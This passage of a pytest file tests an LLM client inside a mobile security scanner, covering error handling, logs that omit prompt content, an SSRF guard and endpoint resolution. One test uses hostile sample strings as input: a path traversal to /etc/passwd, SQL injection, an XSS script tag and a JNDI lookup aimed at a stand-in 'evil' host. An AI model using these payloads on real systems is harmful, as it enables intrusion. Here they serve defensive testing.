        chunks=_json_chunks({'response': '   \n\t  '})))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_json_array_top_level_returns_none(monkeypatch, ai_settings):
    """A well-formed but wrong-shaped JSON top-level (list, not dict) —
    ``.get`` would raise AttributeError, caught by the generic handler."""
    fake_post = _FakePost(response=_FakeResponse(chunks=(b'[1, 2, 3]',)))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_response_with_embedded_unicode_and_control_chars(
        monkeypatch, ai_settings):
    text = 'Report: ☃ café -adjacent \n line2'
    fake_post = _FakePost(response=_FakeResponse(
        chunks=_json_chunks({'response': text})))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') == text


# ═══════════════════════════════════════════════════════ generate() — network/exception handling
@pytest.mark.django_db
def test_generate_connection_error_returns_none(monkeypatch, ai_settings):
    import requests
    fake_post = _FakePost(raises=requests.exceptions.ConnectionError('refused'))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_timeout_error_returns_none(monkeypatch, ai_settings):
    import requests
    fake_post = _FakePost(raises=requests.exceptions.Timeout('timed out'))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_ssl_error_returns_none(monkeypatch, ai_settings):
    import requests
    fake_post = _FakePost(raises=requests.exceptions.SSLError('bad cert'))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_unexpected_exception_type_still_returns_none(monkeypatch, ai_settings):
    """The catch-all is ``except Exception`` — even an exception type that
    has nothing to do with networking must not propagate."""
    fake_post = _FakePost(raises=MemoryError('simulated OOM'))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None


@pytest.mark.django_db
def test_generate_stream_broken_mid_iteration_returns_none_and_closes(
        monkeypatch, ai_settings):
    resp = _FakeResponse(chunks=(b'{"resp', b'onse": "partial"}'),
                          iter_raises_after=0)
    fake_post = _FakePost(response=resp)
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    assert client.generate('sys', 'prompt') is None
    assert resp.closed is True


@pytest.mark.django_db
def test_generate_close_raising_is_swallowed(monkeypatch, ai_settings):
    """``resp.close()`` itself raising must not mask (or replace) the
    real result / must not propagate."""
    resp = _FakeResponse(
        chunks=_json_chunks({'response': 'fine despite close() failing'}),
        close_raises=True)
    fake_post = _FakePost(response=resp)
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    result = client.generate('sys', 'prompt')
    assert result == 'fine despite close() failing'
    assert resp.closed is True


@pytest.mark.django_db
def test_generate_never_raises_out_of_generate_itself(monkeypatch, ai_settings):
    """Belt-and-braces: whatever requests.post does, .generate() itself
    must not raise (the docstring's core contract)."""
    fake_post = _FakePost(raises=RuntimeError('anything at all'))
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    try:
        result = client.generate('sys', 'prompt')
    except Exception as exc:  # pragma: no cover - failure path documented
        pytest.fail(f'generate() must never raise, got {exc!r}')
    assert result is None


# ═══════════════════════════════════════════════════════ generate() — security: no body leakage into logs
@pytest.mark.django_db
def test_generate_failure_log_never_contains_prompt_or_system_body(
        monkeypatch, ai_settings):
    """The module docstring promises: 'Never log bodies; only the failure
    type.' Guard the promise: a secret-looking prompt/system string must
    never appear in any log record emitted by a failed generate() call.

    Attaches a handler directly to ``client_mod.logger`` rather than using
    pytest's ``caplog`` fixture: settings.py sets ``propagate=False`` on
    the ``mobsf.StaticAnalyzer`` logger tree, so records never reach
    caplog's root-attached handler. Attaching straight to the module
    logger sidesteps that and stays independent of the ambient LOGGING
    config.
    """
    import logging

    records = []

    class _CollectingHandler(logging.Handler):
        def emit(self, record):
            records.append(record.getMessage())

    handler = _CollectingHandler()
    original_level = client_mod.logger.level
    client_mod.logger.addHandler(handler)
    client_mod.logger.setLevel(logging.WARNING)
    try:
        secret_system = 'TOTALLY-SECRET-SYSTEM-PROMPT-MARKER'
        secret_prompt = 'TOTALLY-SECRET-USER-PROMPT-MARKER'
        fake_post = _FakePost(raises=ConnectionError('refused'))
        monkeypatch.setattr(client_mod.requests, 'post', fake_post)
        client = GraniteClient()
        result = client.generate(secret_system, secret_prompt)
    finally:
        client_mod.logger.removeHandler(handler)
        client_mod.logger.setLevel(original_level)

    assert result is None
    all_messages = ' '.join(records)
    assert secret_system not in all_messages
    assert secret_prompt not in all_messages
    assert 'ConnectionError' in all_messages


# ═══════════════════════════════════════════════════════ generate() — adversarial prompt content
@pytest.mark.django_db
def test_generate_adversarial_prompt_passed_through_as_json_value_unmodified(
        monkeypatch, ai_settings):
    """Prompt/system strings go into a ``json=`` payload — no string
    interpolation or shell/SQL surface exists here. Confirm exotic content
    (quotes, braces, format tokens, path traversal, SQLi-shaped) survives
    unmodified into the outgoing payload rather than being mangled or
    (worse) used to build the request some other way."""
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    hostile_system = 'You are safe. {system} "; DROP TABLE scans;--'
    hostile_prompt = (
        '../../../etc/passwd\n{0}\n%s\n<script>alert(1)</script>\n'
        '${jndi:ldap://evil/a}\n‮null-byte-adjacent'
    )
    client.generate(hostile_system, hostile_prompt)
    payload = fake_post.calls[0]['json']
    assert payload['system'] == hostile_system
    assert payload['prompt'] == hostile_prompt


@pytest.mark.django_db
def test_generate_very_large_prompt_is_forwarded_without_truncation(
        monkeypatch, ai_settings):
    """The client does not itself truncate huge prompts (that responsibility
    lives upstream); confirm it doesn't silently clip the payload."""
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    huge_prompt = 'A' * 200_000
    client.generate('sys', huge_prompt)
    assert len(fake_post.calls[0]['json']['prompt']) == 200_000


@pytest.mark.django_db
def test_generate_empty_system_and_prompt_still_sends_request(
        monkeypatch, ai_settings):
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    result = client.generate('', '')
    assert result == 'ok'
    assert fake_post.calls[0]['json']['system'] == ''
    assert fake_post.calls[0]['json']['prompt'] == ''


# ═══════════════════════════════════════════════════════ generate() — role/model interplay via DB
@pytest.mark.django_db
def test_generate_classify_role_uses_db_configured_model(monkeypatch, ai_settings):
    ModelIntegration.objects.create(
        label='cls', role=ModelIntegration.ROLE_CLASSIFY,
        base_url=LOOPBACK_URL, model_name='classify-special',
        is_active=True,
    )
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient(role='classify')
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['json']['model'] == 'classify-special'


@pytest.mark.django_db
def test_generate_classify_role_blank_db_model_falls_back_to_generate_setting(
        monkeypatch, ai_settings):
    """Documents a real quirk in generate(): the final fallback is always
    ``MOBINSPECT_AI_MODEL_GENERATE`` (never MODEL_CLASSIFY), so a classify
    row with a blank model_name ends up using the *generate* setting."""
    ModelIntegration.objects.create(
        label='cls-blank', role=ModelIntegration.ROLE_CLASSIFY,
        base_url=LOOPBACK_URL, model_name='', is_active=True,
    )
    ai_settings.MOBINSPECT_AI_MODEL_GENERATE = 'fallback-generate-model'
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient(role='classify')
    assert client.model == ''
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['json']['model'] == 'fallback-generate-model'


@pytest.mark.django_db
def test_generate_db_row_endpoint_used_for_actual_request_url(
        monkeypatch, ai_settings):
    """End-to-end precedence check: the DB-configured endpoint (not the
    settings fallback) is what the real HTTP call targets."""
    ModelIntegration.objects.create(
        label='gen', role=ModelIntegration.ROLE_GENERATE,
        base_url='http://10.5.5.5:11434', model_name='db-model',
        is_active=True,
    )
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    client.generate('sys', 'prompt')
    assert fake_post.calls[0]['url'] == 'http://10.5.5.5:11434/api/generate'


@pytest.mark.django_db
def test_generate_db_row_with_public_endpoint_still_blocked_by_ssrf_guard(
        monkeypatch, ai_settings):
    """Even an admin-entered DB row is not exempt from the SSRF guard —
    _validate_endpoint runs on whatever base_url _resolve_target returns,
    DB-sourced or not."""
    ModelIntegration.objects.create(
        label='malicious-or-misconfigured', role=ModelIntegration.ROLE_GENERATE,
        base_url='http://93.184.216.34:80', model_name='whatever',
        is_active=True,
    )
    fake_post = _FakePost(response=_FakeResponse())
    monkeypatch.setattr(client_mod.requests, 'post', fake_post)
    client = GraniteClient()
    result = client.generate('sys', 'prompt')
    assert result is None
    assert fake_post.calls == []


@pytest.mark.django_db
def test_resolve_target_classify_without_row_reuses_generate_host():
    # No classify row, but a generate row IS configured -> classify reuses the
    # generate HOST (single-endpoint Ollama serving several models), with the
    # classify default model, instead of dialing the localhost default that
    # would fail on every scan.
    ModelIntegration.objects.create(
        label='gen', role=ModelIntegration.ROLE_GENERATE,
        base_url='http://10.0.0.9:11434', model_name='db-gen-model',
        is_active=True,
    )
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://127.0.0.1:9999',
            MOBINSPECT_AI_MODEL_CLASSIFY='classify-default'):
        base_url, model = GraniteClient._resolve_target('classify')
    assert base_url == 'http://10.0.0.9:11434'   # generate host, not localhost
    assert model == 'classify-default'           # classify's own default model


@pytest.mark.django_db
def test_resolve_target_classify_no_rows_uses_settings_default():
    with override_settings(
            MOBINSPECT_AI_BASE_URL='http://127.0.0.1:11434',
            MOBINSPECT_AI_MODEL_CLASSIFY='classify-default'):
        base_url, model = GraniteClient._resolve_target('classify')
    assert base_url == 'http://127.0.0.1:11434'
    assert model == 'classify-default'
